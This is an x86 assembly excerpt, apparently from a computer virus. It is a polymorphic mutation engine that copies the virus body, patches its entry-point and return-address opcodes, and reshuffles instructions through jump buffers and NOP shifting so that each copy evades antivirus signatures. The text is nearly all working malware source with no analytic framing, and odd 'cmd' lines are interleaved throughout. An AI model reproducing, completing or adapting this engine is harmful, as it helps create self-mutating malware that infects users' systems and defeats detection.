   ; generate new polymorphic copy. all permutation technics are here

   ; resulting buffer      -- buf

   cmd
   gen_copy:
   cmd
                           pusha
   cmd
                           cld
   cmd
                           seh_init
   cmd
                           cmp     is_copy, 1
   cmd
                           je      __alredy
   cmd
                           mov     is_copy, 1
   cmd
                           lea     esi, start
   cmd
                           lea     edi, buf
   cmd
                           mov     ecx, CODESIZE
   cmd
                           rep     movsb
   cmd
   __alredy:
   cmd
                           lea     esi, buf-start + vir_start_opcode
   cmd
   __x1:                   call    process_cmd
   cmd
                           cmp     byte ptr [esi], 0BDh ; mov ebp, xxx
   cmd
                           jne     __x1
   cmd
                           mov     eax, patch_start
   cmd
                           mov     [esi+1], eax
   cmd
                           lea     esi, buf-start + old_eip_opcode
   cmd
   __x2:                   call    process_cmd
   cmd
                           cmp     byte ptr [esi], 0B8h ; mov eax, xxx
   cmd
                           jne     __x2
   cmd
                           mov     eax, patch_eip
   cmd
                           mov     [esi+1], eax
   cmd
                           lea     esi, buf
   cmd
   __cycle:
   cmd
                           call    process_cmd
   cmd
                           add     esi, PLYSIZE
   cmd
                           cmp     esi, offset buf + realsize
   cmd
                           jb      __cycle
   cmd
                           clc
   cmd
                           seh_done
   cmd
                           popa
   cmd
                           ret
   cmd
   process_cmd:            pusha
   cmd
                           mov     eax, [esi]
   cmd
                           cmp     al, 0E8h
   cmd
                           je      __exit
   cmd
                           and     ah, 0F0h
   cmd
                           cmp     ax, 800Fh
   cmd
                           je      __exit
   cmd
                           and     al, 0F0h
   cmd
                           cmp     al, 70h
   cmd
                           je      __exit
   cmd
                           rnd     3
   cmd
                           jz      __swapopcode
   cmd
                           dec     eax
   cmd
                           jz      __flyopcode
   cmd
   __exit:
   cmd
                           popa
   cmd
                           ret
   cmd
   __swapopcode:           cmp     [esi].byte ptr 0, 0E9h
   cmd
                           je      __xbuf2code
   cmd
                           jne     __code2xbuf
   cmd
   __code2xbuf:
   cmd
                           call    __findxbufplace
   cmd
                           jc      __exit
   cmd
                           pusha
   cmd
                           mov     ecx, PLYSIZE
   cmd
                           rep     movsb
   cmd
                           mov     al, 0E9h
   cmd
                           stosb
   cmd
                           lea     eax, [edi+4]
   cmd
                           sub     esi, eax
   cmd
                           mov     [edi], esi
   cmd
                           popa
   cmd
                           mov     byte ptr [esi], 0E9h
   cmd
                           sub     edi, esi
   cmd
                           sub     edi, 5
   cmd
                           mov     [esi+1], edi
   cmd
                           lea     edi, [esi+5]
   cmd
                           mov     ecx, PLYSIZE-5
   cmd
                           xor     eax, eax
   cmd
                           rep     stosb
   cmd
                           stc
   cmd
                           jc      __exit
   cmd
   __xbuf2code:            lea     ebx, [esi+5]
   cmd
                           add     ebx, [esi+1]
   cmd
                           mov     edi, esi
   cmd
                           mov     esi, ebx
   cmd
                           mov     ecx, PLYSIZE
   cmd
                           rep     movsb
   cmd
                           mov     edi, ebx
   cmd
                           mov     ecx, PLYSIZE+5
   cmd
                           xor     eax, eax
   cmd
                           rep     stosb
   cmd
                           clc
   cmd
                           jnc     __exit
   cmd
   __findxbufplace:        pusha
   cmd
                           mov     edx, 1000       ; try # times before error
   cmd
   __findcycle:
   cmd
                           dec     edx
   cmd
                           jz      __cantfind
   cmd
                           rnd     xbuf_size
   cmd
                           lea     edi, [buf + (xbuf-start) + eax - 32]
   cmd
                           mov     ecx, 32+PLYSIZE+32
   cmd
                           xor     eax, eax
   cmd
                           repz    scasb
   cmd
                           jnz     __findcycle
   cmd
                           sub     edi, PLYSIZE+32
   cmd
                           mov     [esp], edi      ; popa.edi
   cmd
                           clc
   cmd
                           popa
   cmd
                           ret
   cmd
   __cantfind:             stc
   cmd
                           popa
   cmd
                           ret
   cmd
   __flyopcode:
   cmd
                           cmp     byte ptr [esi], 0E9h
   cmd
                           je      __exit
   cmd
                           cmp     byte ptr [esi], 90h
   cmd
                           je      __flyup
   cmd
                           jne     __flydown
   cmd
   __flyup:
   cmd
                           mov     edi, esi
   cmd
                           inc     esi
   cmd
                           mov     ecx, PLYSIZE-1
   cmd
                           rep     movsb
   cmd
                           mov     al, 90h
   cmd
                           stosb
   cmd
                           or      esp, esp
   cmd
                           jnz     __exit
   cmd
   __flydown:
   cmd
                           pusha
   cmd
                           lea     edi, [esi+PLYSIZE-1]
   cmd
                           lea     esi, [edi-1]
   cmd
                           mov     ecx, PLYSIZE-1
   cmd
                           std
   cmd
                           rep     movsb
   cmd
                           cld
   cmd
                           mov     al, 90h
   cmd
                           stosb
   cmd
                           popa
   cmd
                           mov     eax, [esi+PLYSIZE-4]
   cmd
                           neg     eax
   cmd
                           cmp     eax, -90909090h
   cmd
                           je      __flydown
   cmd
                           jne     __exit
   cmd
